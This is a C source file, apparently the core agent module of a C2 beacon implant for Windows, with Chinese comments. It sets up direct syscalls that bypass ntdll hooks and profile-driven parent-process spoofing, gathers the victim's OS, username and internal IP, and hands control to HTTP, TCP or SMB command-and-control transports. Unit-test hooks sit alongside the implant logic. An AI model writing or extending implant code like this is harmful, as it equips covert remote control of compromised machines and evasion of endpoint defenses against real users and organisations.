#include "beacon_agent_internal.h"
#include "beacon_spawn.h"

#ifdef BEACON_TEST
#include "beacon_test_hooks.h"
#endif

#pragma comment(lib, "ws2_32.lib")

#ifdef BEACON_TEST
static INT (WINAPI *g_agent_wsa_startup_provider)(WORD, LPWSADATA) = WSAStartup;
static INT (WINAPI *g_agent_wsa_cleanup_provider)(VOID) = WSACleanup;
static volatile LONG g_agent_wsa_startup_calls;
static volatile LONG g_agent_wsa_cleanup_calls;

VOID AgentTestSetWinsockProviders(INT (WINAPI *startup)(WORD, LPWSADATA), INT (WINAPI *cleanup)(VOID))
{
    g_agent_wsa_startup_provider = startup ? startup : WSAStartup;
    g_agent_wsa_cleanup_provider = cleanup ? cleanup : WSACleanup;
}

VOID AgentTestResetWinsockProviders(VOID)
{
    g_agent_wsa_startup_provider = WSAStartup;
    g_agent_wsa_cleanup_provider = WSACleanup;
    InterlockedExchange(&g_agent_wsa_startup_calls, 0);
    InterlockedExchange(&g_agent_wsa_cleanup_calls, 0);
}

LONG AgentTestGetWinsockStartupCalls(VOID)
{
    return InterlockedCompareExchange(&g_agent_wsa_startup_calls, 0, 0);
}

LONG AgentTestGetWinsockCleanupCalls(VOID)
{
    return InterlockedCompareExchange(&g_agent_wsa_cleanup_calls, 0, 0);
}
#endif

#if defined(BEACON_EXTERNAL_TCP_BUILD) && \
    (defined(BEACON_INTERNAL_TCP_BUILD) || defined(BEACON_INTERNAL_SMB_BUILD))
#error BEACON_EXTERNAL_TCP_BUILD cannot be combined with internal transport builds.
#endif

/*
 * Agent 层是 Beacon 的主循环调度入口：
 * 初始化上下文，根据 profile/build 选择 external/internal 运行模式。
 */

/* 初始化 Agent 结构体、Win32 API 解析及 Winsock */
INT AgentInit(Agent* agent)
{
    if (!agent) {
        return 0;
    }

    SecureZeroMemory(agent, sizeof(*agent));

    if (!ContextInit(&agent->ctx)) {
        return 0;
    }

    /* ContextInit 会清零 BeaconContext，API 解析必须在它之后执行。 */
    if (!Win32ApiInit(&agent->ctx.api)) {
        ContextFree(&agent->ctx);
        return 0;
    }

    /* syscall 层依赖 Win32ApiInit 解析出的 ntdll 地址，必须在它之后初始化。
     * 是否绑定（启用 syscall）由 profile.syscall_enabled 决定，运行中可用
     * `syscall on|off` 命令切换（SyscallSetEnabled，恢复 original 地址）。 */
    SyscallInit(&agent->ctx.syscall);
    if (agent->ctx.profile.syscall_enabled) {
        SyscallBindApiTable(&agent->ctx.syscall, &agent->ctx.api);
    }

    /* 应用 profile 的 PPID 欺骗目标（进程名或 PID；空 = 不欺骗），
     * 运行中可用 spawn_ppid 命令覆盖。 */
    SpawnApplyProfile(&agent->ctx.api, agent->ctx.profile.spawn_ppid);

#ifdef BEACON_TEST
    InterlockedIncrement(&g_agent_wsa_startup_calls);
    BeaconTestRecord(BEACON_TEST_EVENT_WSA_STARTUP, 0, 0);
    if (g_agent_wsa_startup_provider(MAKEWORD(2, 2), &agent->wsa) != 0) {
#else
    if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
#endif
        SyscallCleanup(&agent->ctx.syscall);
        ContextFree(&agent->ctx);
        return 0;
    }
    agent->wsa_started = 1;

    agent->initialized = 1;
    agent->stop = 0;
    return 1;
}

/* 释放 Agent 资源并清理 Winsock */
VOID AgentFree(Agent* agent)
{
    if (!agent) {
        return;
    }

    if (agent->initialized) {
        SyscallCleanup(&agent->ctx.syscall);
        ContextFree(&agent->ctx);
        agent->initialized = 0;
    }

    if (agent->wsa_started) {
#ifdef BEACON_TEST
        InterlockedIncrement(&g_agent_wsa_cleanup_calls);
        g_agent_wsa_cleanup_provider();
#else
        WSACleanup();
#endif
        agent->wsa_started = 0;
    }
}

/* 信标主循环：按构建/profile 分发到具体 transport runner */
INT AgentRun(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent || !agent->initialized) {
        return -1;
    }

#ifdef BEACON_TEST
    BeaconTestRecord(BEACON_TEST_EVENT_AGENT_RUN_BEGIN, 0, 0);
#endif

    ctx = &agent->ctx;

    DebugPrintf("[*] Beacon modular C starting...\n");
    DebugPrintf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
                ctx->meta.os, ctx->meta.arch, ctx->meta.username, ctx->meta.internal_ip);
    DebugPrintf("[*] BeaconID: %lu\n", (ULONG)ctx->beacon_id);

#if defined(BEACON_EXTERNAL_TCP_BUILD)
    return AgentRunExternalTcp(agent);
#else
    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "tcp") == 0) {
        return AgentRunInternalTcp(agent);
    }

    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "smb") == 0) {
        return AgentRunInternalSmb(agent);
    }

    return AgentRunExternalHttp(agent);
#endif
}

/* 请求 Agent 停止 */
VOID AgentStop(Agent* agent)
{
    if (agent) {
        InterlockedExchange(&agent->stop, 1);
    }
}
